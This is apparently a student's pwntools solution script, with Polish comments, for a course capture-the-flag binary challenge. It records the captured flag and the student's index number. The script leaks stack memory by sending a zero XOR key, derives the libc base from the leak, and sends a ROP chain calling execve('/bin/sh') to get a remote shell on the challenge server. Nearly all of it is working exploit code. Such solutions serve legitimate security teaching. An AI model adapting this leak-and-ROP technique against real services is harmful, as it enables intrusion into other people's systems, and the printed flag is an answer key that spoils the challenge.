#!/usr/bin/env python3

# Numer indeksu: 438247
# Nazwa zadania: hard
# flaga: bsk{f4d5c570a9bac61a2cf06391cea14728}

from typing import assert_type
from pwn import *

# exe = ELF("./easy")
# exe = ELF("./medium")
# hard chall is dynamically linked, so here's helper
# patched version to load proper ld and libc
exe = ELF("./hard_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
index_number = b"438247"

def conn():
    # r = process([exe.path, index_number])
    # gdb.attach(r)
    r = remote("bsk.bonus.re", 13337)
    return r

# main_addr = 0x0000555555555410 \ # gdb hard b main run 438247 vmmap
#           - 0x0000555555554000

libc_off    = 0x000280d0 # gdb hard_patched ...
bin_sh      = 0x001c041b # strings -tx libc.so.6 | grep '/bin/sh'
pop_rax     = 0x00046663 # ROPgadget --binary libc.so.6 | grep 'pop rax ; ret'
pop_rdi     = 0x00028715 # ROPgadget --binary libc.so.6 | grep 'pop rdi ; ret'
pop_rsi     = 0x0002a671 # ROPgadget --binary libc.so.6 | grep 'pop rsi ; ret'
pop_rdx_rbx = 0x00093359 # ROPgadget --binary libc.so.6 | grep 'pop rdx ; pop rbx ; ret'
syscall     = 0x0002686d # ROPgadget --binary libc.so.6 | grep 'syscall' | grep 2686d

def solve(r):
    # data_len = 8
    # key_len = data_len + 8*9 + 8 + 9*8 = 152

    r.recvn(21 + 1)         # odbierz "How long is the data?\n"
    r.sendline(b'8')        # wyślij data_len
    r.recvn(10)             # odbierz "Gib data: "
    r.sendline(b'xd' * 4)   # wyślij data
    r.recvn(1 + 20 + 1)     # odbierz "\nHow long is the key?\n"
    r.sendline(b'152')      # wyślij key_len
    r.recvn(9)              # odbierz "Gib key: "
    r.sendline(p64(0) * 19) # wyślij 0 key, aby otrzymać zawartość stosu: stos ^ 0 = stos
    r.recvn(1 + 27 + 1)     # odbierz "\nHere's your decrypted data:\n"
    stack = r.recvn(152)    # odbierz stack content

    libc = u64(stack[13*8:13*8+8]) - libc_off # można zobaczyć w gdb, że tutaj właśnie siedzi offset libc

    message = (
            p64(0) + p64(0)*8                            # 0 bajty dla rzeczy, których nie chcemy ruszać np kanarek
          + p64(libc + pop_rax)     + p64(59)            # ROP: rax = 59
          + p64(libc + pop_rdi)     + p64(libc + bin_sh) #      rdi = /bin/sh
          + p64(libc + pop_rsi)     + p64(0)             #      rsi = 0
          + p64(libc + pop_rdx_rbx) + p64(0)*2           #      rdx = 0, rbx = 0
          + p64(libc + syscall)                          # syscall z powyższymi argumentami
    )
    for i in range(9, 19): # xor wiadomości i otrzymanych bajtów ze stosu
        message = message[:i*8] + p64(u64(message[i*8:i*8+8]) \
                ^ u64(stack[i*8:i*8+8])) + message[i*8+8:]

    r.recvn(21 + 1)         # odbierz "How long is the data?\n"
    r.sendline(b'8')        # wyślij data_len
    r.recvn(10)             # odbierz "Gib data: "
    r.sendline(b'xd' * 4)   # wyślij data
    r.recvn(1 + 20 + 1)     # odbierz "\nHow long is the key?\n"
    r.sendline(b'152')      # wyślij key_len
    r.recvn(9)              # odbierz "Gib key: "
    r.sendline(message)     # wyślij wiadomość ROP i uzyskaj dostęp do shella
    r.recvn(1 + 27 + 1)     # odbierz "\nHere's your decrypted data:\n"
    stack = r.recvn(152)    # odbierz jakieś bajty żeby tryb interaktywny się nie psuł

def main():
    r = conn()
    r.sendline(b'438247')
    r.sendline(b'1')
    for i in range(9): r.recvline() # odbierz wiadomość powitalną; gdy się tego nie zrobi, to się psuje funkcja solve()
    solve(r)
    r.interactive()

if __name__ == "__main__":
    main()
